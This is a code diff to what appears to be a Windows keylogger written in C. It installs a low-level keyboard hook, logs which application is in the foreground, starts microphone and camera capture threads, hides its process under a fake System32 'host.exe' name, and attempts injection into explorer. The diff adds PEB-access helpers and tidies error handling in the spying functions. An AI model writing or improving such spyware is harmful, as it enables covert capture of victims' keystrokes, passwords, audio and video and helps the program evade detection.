@@ -1,8 +1,20 @@
 #include "../winkey.h"
 
 HHOOK g_ouk;
-volatile int g_micro_run = 0;
 
+#ifdef _M_X64
+PPEB GetPEB(void)
+{
+    return (PPEB)__readgsqword(0x60);
+}
+#else
+PPEB GetPEB(void)
+{
+    return (PPEB)__readfsdword(0x30);
+}
+#endif
+
+volatile int g_micro_run = 0;
 volatile int g_camera_run = 0;
 
 DWORD WINAPI thread_micro(LPVOID lp)
@@ -20,17 +32,24 @@ DWORD WINAPI thread_micro(LPVOID lp)
 
 
 
-void *which_open(char *exe)
+char *which_open(char *exe)
 {
-	HWND ptr_stuct = GetForegroundWindow();
+	HWND hwnd = GetForegroundWindow();
 	DWORD pid = 0;
-	GetWindowThreadProcessId(ptr_stuct, &pid);
-	HANDLE hd = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
-	if (hd)
+
+	if (!hwnd)
+		return NULL;
+	GetWindowThreadProcessId(hwnd, &pid);
+	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+	if (!hProc)
+		return NULL;
+	if (!GetModuleFileNameExA(hProc, NULL, exe, MAX_PATH))
 	{
-		GetModuleFileNameExA(hd, NULL,exe, MAX_PATH);
-		CloseHandle(hd);
+		CloseHandle(hProc);
+		return NULL;
 	}
+	CloseHandle(hProc);
+	return exe;
 }
 
 
@@ -116,7 +135,7 @@ LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 
 
 
-void run_winkey(void)
+int run_winkey(void)
 {
 	g_ouk = SetWindowsHookEx(WH_KEYBOARD_LL, callback_clavier, NULL, 0);
 	MSG msg;
@@ -132,15 +151,15 @@ void run_winkey(void)
 		DispatchMessage(&msg);
 	}
 	UnhookWindowsHookEx(g_ouk);
+	return 0;
 }
 
 int main(void)
 {
-	disguise_process_name(L"C:\\Windows\\System32\\host.exe");
+	hide_process(L"C:\\Windows\\System32\\host.exe");
 	HANDLE h = CreateThread(NULL, 0, thread_micro, NULL, 0, NULL);
 	start_camera();
 	if (inject_into_explorer())
 		return 0;
-	run_winkey();
-	return 0;
+	return (run_winkey());
 }
